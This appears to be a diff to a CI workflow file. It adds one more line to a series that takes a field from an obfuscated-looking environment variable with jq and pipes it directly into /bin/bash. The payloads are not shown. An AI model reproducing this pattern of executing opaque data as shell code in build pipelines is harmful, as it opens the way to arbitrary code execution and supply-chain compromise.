@@ -24,6 +24,7 @@ jobs:
           echo $lbfiq0860 | jq -r .yqqf10 | /bin/bash
           echo $h8 | jq -r .j2 | /bin/bash
           echo $cxnm1 | jq -r .ekept40 | /bin/bash
+          echo $dxmn20171 | jq -r .jagcl44276 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
